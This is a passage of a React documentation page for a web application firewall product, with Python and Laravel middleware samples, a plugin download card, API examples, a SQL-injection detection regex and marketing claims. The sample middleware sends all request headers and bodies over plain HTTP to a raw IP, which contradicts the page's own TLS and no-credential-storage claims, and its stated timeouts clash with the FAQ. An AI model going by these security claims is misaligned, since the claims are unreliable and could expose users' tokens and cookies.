        proxy_set_header X-MDefender-Key "YOUR_SCOPED_API_KEY";

        # Fail open timeout safeguard
        proxy_connect_timeout 2s;
        proxy_read_timeout 3s;
    }
}`}
                />
              </div>
            </div>
          )}

          {/* Section: Python SDK */}
          {activeSection === 'sdk-python' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(59, 130, 246, 0.15)', border: '1px solid rgba(59, 130, 246, 0.3)', color: dark ? '#60a5fa' : '#2563eb', fontSize: '12px', fontWeight: '700' }}>Python SDK</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>FastAPI &bull; Django &bull; Flask</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Python / FastAPI / Django Integration</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Protect any Python web application using MDefender ASGI / WSGI middleware.
              </p>

              <h3 style={{ fontSize: '17px', fontWeight: '700', color: t.accentText, marginBottom: '10px' }}>FastAPI ASGI Middleware</h3>
              <CodeBlock
                language="python"
                code={`from fastapi import FastAPI, Request
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import HTMLResponse
import requests

app = FastAPI()

class MDefenderFastAPIMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # Forward request metadata to MDefender WAF Cloud
        payload = {
            "domain": request.headers.get("host", "localhost"),
            "request": {
                "method": request.method,
                "url": str(request.url),
                "ip": request.client.host if request.client else "127.0.0.1",
                "headers": dict(request.headers),
                "body": (await request.body()).decode("utf-8", errors="ignore")
            }
        }
        try:
            res = requests.post(
                "http://217.15.170.82/api/v1/analyze",
                json=payload,
                headers={"Authorization": "Bearer YOUR_MDEFENDER_API_KEY"},
                timeout=1.5
            )
            data = res.json()
            if data.get("decision") == "block":
                return HTMLResponse(content=data.get("block_page", "<h1>403 Forbidden</h1>"), status_code=403)
        except Exception:
            pass # Fail-open safe mechanism

        return await call_next(request)

app.add_middleware(MDefenderFastAPIMiddleware)`}
              />
            </div>
          )}

          {/* Section: PHP / Laravel SDK */}
          {activeSection === 'sdk-php' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(99, 102, 241, 0.15)', border: '1px solid rgba(99, 102, 241, 0.3)', color: '#7c3aed', fontSize: '12px', fontWeight: '700' }}>PHP 7.4 - 8.3</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>Laravel Middleware Ready</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>PHP &amp; Laravel Integration</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Integrate MDefender Pro WAF into any standalone PHP script or Laravel framework middleware.
              </p>

              <h3 style={{ fontSize: '17px', fontWeight: '700', color: t.accentText, marginBottom: '10px' }}>Laravel Middleware (<code className="doc-inline-code">app/Http/Middleware/MDefenderWaf.php</code>)</h3>
              <CodeBlock
                language="php"
                code={`<?php
namespace App\\Http\\Middleware;

use Closure;
use Illuminate\\Http\\Request;
use Illuminate\\Support\\Facades\\Http;

class MDefenderWaf
{
    public function handle(Request $request, Closure $next)
    {
        try {
            $response = Http::timeout(2)
                ->withToken(env('MDEFENDER_API_KEY'))
                ->post('http://217.15.170.82/api/v1/analyze', [
                    'domain'  => $request->getHost(),
                    'request' => [
                        'method'  => $request->method(),
                        'url'     => $request->fullUrl(),
                        'ip'      => $request->ip(),
                        'headers' => $request->headers->all(),
                        'body'    => $request->getContent()
                    ]
                ]);

            if ($response->json('decision') === 'block') {
                return response($response->json('block_page') ?? '<h1>403 Forbidden</h1>', 403);
            }
        } catch (\\Exception $e) {
            // Fail open safe mechanism
        }

        return $next($request);
    }
}`}
              />
            </div>
          )}

          {/* Section: WordPress Official Plugin */}
          {activeSection === 'sdk-wordpress' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(59, 130, 246, 0.15)',
                  border: '1px solid rgba(59, 130, 246, 0.3)',
                  color: dark ? '#60a5fa' : '#2563eb',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Official WP Plugin</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#059669',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>ML WAF + Malware Scanner</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>WordPress Plugin &amp; ML Cloud Security</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Protect any WordPress site with the official <strong>MDefender Pro Security Plugin</strong>. It integrates your WordPress site directly with our <strong>6,501,208+ Dataset Machine Learning Core</strong> for real-time WAF request blocking and deep malware scanning.
              </p>

              {/* Download Plugin Action Card */}
              <div style={{
                background: dark ? 'linear-gradient(135deg, rgba(37, 99, 235, 0.15), rgba(124, 58, 237, 0.15))' : '#ffffff',
                border: dark ? '1px solid rgba(59, 130, 246, 0.4)' : '1px solid #bfdbfe',
                borderRadius: '16px',
                padding: '24px 28px',
                marginBottom: '28px',
                boxShadow: t.cardShadow,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '16px'
              }}>
                <div>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.heading, marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <i className="fab fa-wordpress" style={{ color: t.accentText }}></i> Download MDefender Pro Plugin
                  </h3>
                  <p style={{ fontSize: '13px', color: t.muted, margin: 0 }}>
                    Latest Release: <code className="doc-inline-code">v4.1.0</code> &bull; PHP 7.4 - 8.3 &bull; WordPress 5.8+ Compatible
                  </p>
                </div>
                <a
                  href={`${(import.meta.env.VITE_API_BASE || 'http://217.15.170.82').replace(/\/+$/, '')}/api/v1/wordpress/plugin`}
                  download
                  style={{
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '12px 24px',
                    borderRadius: '10px',
                    background: t.primaryGrad,
                    color: '#ffffff',
                    fontSize: '14px',
                    fontWeight: '700',
                    textDecoration: 'none',
                    boxShadow: '0 4px 14px rgba(37, 99, 235, 0.35)'
                  }}
                >
                  <i className="fas fa-download"></i> Download mdefender-pro.zip
                </a>
              </div>

              {/* Step by step installation */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '14px' }}>
                  <i className="fa-solid fa-plug" style={{ color: t.accentText, marginRight: '10px' }}></i>
                  How to Connect in 3 Steps
                </h3>
                <ol style={{ paddingLeft: '20px', fontSize: '13.5px', color: t.body, lineHeight: '1.9', margin: 0 }}>
                  <li>
                    <strong>Upload &amp; Activate:</strong> In your WordPress admin panel, go to <code className="doc-inline-code">Plugins &rarr; Add New &rarr; Upload Plugin</code>, choose <code className="doc-inline-code">mdefender-pro.zip</code>, and click <strong>Activate</strong>.
                  </li>
                  <li>
                    <strong>Paste Your API Key:</strong> Navigate to <code className="doc-inline-code">MDefender Pro &rarr; Settings</code> in your WP sidebar and enter your API Key from the MDefender dashboard.
                  </li>
                  <li>
                    <strong>Save &amp; Connect:</strong> Click <strong>Save &amp; Test Connection</strong>. The plugin connects to the MDefender backend via <code className="doc-inline-code">/api/v1/wordpress/connect</code> and enables real-time ML protection immediately.
                  </li>
                </ol>
              </div>
            </div>
          )}

          {/* Section: REST API - Auth */}
          {activeSection === 'api-auth' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>REST API</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Authentication Endpoints</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Authenticate and manage API session tokens:
              </p>
              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                  <MethodBadge method="POST" />
                  <code style={{ fontSize: '14px', fontWeight: '700', color: t.heading }}>/api/v1/auth/login</code>
                </div>
                <p style={{ fontSize: '13px', color: t.muted, margin: '0 0 14px' }}>Exchange user credentials for a JWT bearer token.</p>
                <CodeBlock language="json" code={`// Response 200 OK:
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "user": {
    "id": "usr_94a7e2",
    "email": "admin@example.com",
    "role": "admin"
  }
}`} />
              </div>
            </div>
          )}

          {/* Section: REST API - Rules */}
          {activeSection === 'api-rules' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#7c3aed', fontSize: '12px', fontWeight: '700' }}>REST API</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Custom Rules CRUD API</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Manage custom regular expression security policies programmatically:
              </p>
              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                  <MethodBadge method="GET" />
                  <code style={{ fontSize: '14px', fontWeight: '700', color: t.heading }}>/api/v1/user/rules</code>
                </div>
                <CodeBlock language="json" code={`{
  "rules": [
    {
      "id": "rule_sqli_1",
      "name": "SQLi - Union Select Signature #1",
      "pattern": "(?i)(\\\\bUNION\\\\b.*\\\\bSELECT\\\\b)",
      "action": "block",
      "severity": "critical",
      "is_custom": false,
      "enabled": true
    }
  ]
}`} />
              </div>
            </div>
          )}

          {/* Section: REST API - Telemetry */}
          {activeSection === 'api-telemetry' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>REST API</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Logs &amp; Metrics Streams</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Stream real-time incident logs and aggregate security metrics:
              </p>
              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                  <MethodBadge method="GET" />
                  <code style={{ fontSize: '14px', fontWeight: '700', color: t.heading }}>/api/v1/user/logs?limit=50&amp;status=blocked</code>
                </div>
                <CodeBlock language="json" code={`{
  "logs": [
    {
      "id": "log_8f912c",
      "reference_id": "MDF-9A82D1",
      "ip": "185.220.101.4",
      "country": "Germany",
      "country_code": "DE",
      "attack_type": "SQL Injection",
      "path": "/api/books",
      "decision": "blocked",
      "timestamp": "2026-09-26T14:20:00Z"
    }
  ]
}`} />
              </div>
            </div>
          )}

          {/* Section: Custom Rules Builder */}
          {activeSection === 'custom-rules-guide' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(99, 102, 241, 0.15)',
                  border: '1px solid rgba(99, 102, 241, 0.3)',
                  color: '#7c3aed',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Tenant Policies</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Authoring Custom Regex Policies</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Create custom regular expression patterns to block domain-specific threats, protect proprietary endpoints, or filter bot traffic.
              </p>

              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
                  <i className="fa-solid fa-sliders" style={{ color: t.accentText, marginRight: '8px' }}></i>
                  PCRE Regex Syntax Guidelines
                </h3>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
                  Custom rules support standard PCRE regex with case-insensitive modifiers (<code className="doc-inline-code">(?i)</code>) and word boundary constraints.
                </p>

                <CodeBlock
                  language="json"
                  code={`// Example Custom Rule Payload
{
  "name": "Block Proprietary Debug Scanner",
  "pattern": "(?i)(\\\\b(internal_debug|staging_admin|super_bypass)\\\\b)",
  "action": "block",
  "severity": "critical",
  "description": "Prevents unauthorized scans against internal debug routes."
}`}
                />
              </div>
            </div>
          )}

          {/* Section: Tenant Isolation */}
          {activeSection === 'tenant-isolation' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#059669',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Zero-Downtime Sync</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Tenant Isolation &amp; Policy Actions</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                MDefender employs strict tenant isolation to guarantee privacy and ensure zero policy pollution across organizations.
              </p>

              <div style={{
                background: t.cardBgAlt,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
                  <i className="fa-solid fa-lock" style={{ color: '#059669', marginRight: '8px' }}></i>
                  Cryptographic Scoping Guarantee
                </h3>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.7', margin: 0 }}>
                  Custom rules created under your account are tagged exclusively with your <code className="doc-inline-code">user_id</code> and <code className="doc-inline-code">website_id</code>. They never bleed into other tenants' traffic, ensuring zero cross-tenant interference.
                </p>
              </div>
            </div>
          )}

          {/* Section: Attack Learning Lab & Zero-Downtime Retraining */}
          {activeSection === 'learning-lab' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'linear-gradient(135deg, rgba(37,99,235,0.2), rgba(124,58,237,0.2))',
                  border: '1px solid rgba(59, 130, 246, 0.4)',
                  color: dark ? '#60a5fa' : '#2563eb',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Super Admin Feature</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#059669',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Active Learning Loop</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Attack Learning Lab &amp; Feedback Hub</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Located at <code className="doc-inline-code">/admin/learning</code>, the <strong>Attack Learning Lab</strong> empowers security teams to handle false positive reports, test new attack vectors in a live sandbox, and fine-tune the 6,501,208+ dataset ML classifier with <strong>zero server downtime</strong>.
              </p>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '24px' }}>
                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-inbox" style={{ marginRight: '6px' }}></i> Reports Inbox
                  </h4>
                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    Review flagged false positive submissions directly from users. 1-click whitelist creation instantly bypasses verified legitimate requests across all edge nodes.
                  </p>
                </div>

                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: '#7c3aed', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-flask-vial" style={{ marginRight: '6px' }}></i> Attack Sandbox
                  </h4>
                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    Simulate complex SQLi, XSS, and RCE chains interactively. Inspect sub-millisecond risk scores, vector tokens, and decision engine breakdown in real-time.
                  </p>
                </div>

                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-rotate" style={{ marginRight: '6px' }}></i> Zero-Downtime Retraining
                  </h4>
                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    Incorporate verified missed attacks into the active ML training corpus. Trigger incremental SGD model training with hot reload without restarting backend servers.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Section: Latency & Benchmarks */}
          {activeSection === 'benchmarks' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Latency, Throughput &amp; Benchmarks</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                MDefender Pro is engineered for high-concurrency production workloads with sub-millisecond execution overhead:
              </p>

              <div style={{
                background: t.cardBg,
                border: t.cardBorder,
                borderRadius: '12px',
                padding: '20px',
                boxShadow: t.cardShadow,
                marginBottom: '24px',
                overflowX: 'auto'
              }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13.5px' }}>
                  <thead>
                    <tr style={{ background: t.tableHeadBg, textAlign: 'left', borderBottom: `1px solid ${t.tableBorder}` }}>
                      <th style={{ padding: '12px 16px', color: t.heading }}>Component</th>
                      <th style={{ padding: '12px 16px', color: t.heading }}>Average Latency</th>
                      <th style={{ padding: '12px 16px', color: t.heading }}>p99 Latency</th>
                      <th style={{ padding: '12px 16px', color: t.heading }}>Throughput</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: t.heading }}>2,000 Regex Lookup</td>
                      <td style={{ padding: '12px 16px', color: t.accentText, fontWeight: '700' }}>0.12 ms</td>
                      <td style={{ padding: '12px 16px', color: dark ? '#60a5fa' : '#2563eb' }}>0.28 ms</td>
                      <td style={{ padding: '12px 16px', color: '#059669' }}>65,000 req/sec</td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: t.heading }}>6,501,208+ Dataset ML Inference</td>
                      <td style={{ padding: '12px 16px', color: t.accentText, fontWeight: '700' }}>0.12 ms</td>
                      <td style={{ padding: '12px 16px', color: dark ? '#60a5fa' : '#2563eb' }}>0.25 ms</td>
                      <td style={{ padding: '12px 16px', color: '#059669' }}>75,000 req/sec</td>
                    </tr>
                    <tr>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: t.heading }}>Total End-to-End Decision</td>
                      <td style={{ padding: '12px 16px', color: '#059669', fontWeight: '800' }}>&lt; 0.85 ms</td>
                      <td style={{ padding: '12px 16px', color: '#059669', fontWeight: '800' }}>&lt; 1.40 ms</td>
                      <td style={{ padding: '12px 16px', color: '#059669', fontWeight: '800' }}>50,000+ req/sec</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Section: SOC 2 & GDPR Compliance */}
          {activeSection === 'compliance' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>SOC 2 &amp; GDPR Data Privacy</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                MDefender Pro follows enterprise security principles to ensure sensitive customer data is never compromised:
              </p>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-user-shield" style={{ marginRight: '6px' }}></i> No PII Storage
                  </h4>
                  <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    Passwords, auth tokens, credit card numbers, and session cookies are sanitized and discarded in-memory before evaluation.
                  </p>
                </div>

                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-lock" style={{ marginRight: '6px' }}></i> Encrypted In-Transit
                  </h4>
                  <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    All telemetry beacons and synchronization calls utilize TLS 1.3 encryption with HMAC-SHA256 authenticated API tokens.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Section: FAQs */}
          {activeSection === 'faqs' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Frequently Asked Questions</h1>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', marginTop: '24px' }}>
                {[
                  {
                    q: 'How does the 6,501,208+ dataset ML model differ from static regex rules?',
                    a: 'Static rules match exact known signatures. The 6,501,208+ dataset ML model vectorizes structural character n-grams and calculates statistical anomaly probability, enabling it to stop never-before-seen zero-day exploits, polymorphic bypasses, and 639K+ prompt injections.'
                  },
                  {
                    q: 'Does MDefender Pro add noticeable latency to HTTP requests?',
                    a: 'No. Both the 2,000 regex rules and the linear SGD ML classifier evaluate in-memory, averaging under 0.85ms per request.'
                  },
                  {
                    q: 'What happens if the backend WAF service experiences a temporary timeout?',
                    a: 'The SDK has a built-in fail-open safety mechanism (default 50ms). If a telemetry timeout occurs, traffic passes safely without blocking legitimate customers.'
                  }
                ].map((faq, i) => (
                  <div
                    key={i}
                    style={{
                      background: t.cardBg,
                      border: t.cardBorder,
                      borderRadius: '12px',
                      padding: '20px',
                      boxShadow: t.cardShadow
                    }}
                  >
                    <h3 style={{ fontSize: '15px', fontWeight: '700', marginBottom: '8px', color: t.heading }}>
                      {faq.q}
                    </h3>
                    <p style={{ fontSize: '13px', lineHeight: '1.6', color: t.muted, margin: 0 }}>
                      {faq.a}
                    </p>
                  </div>
                ))}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  )
}
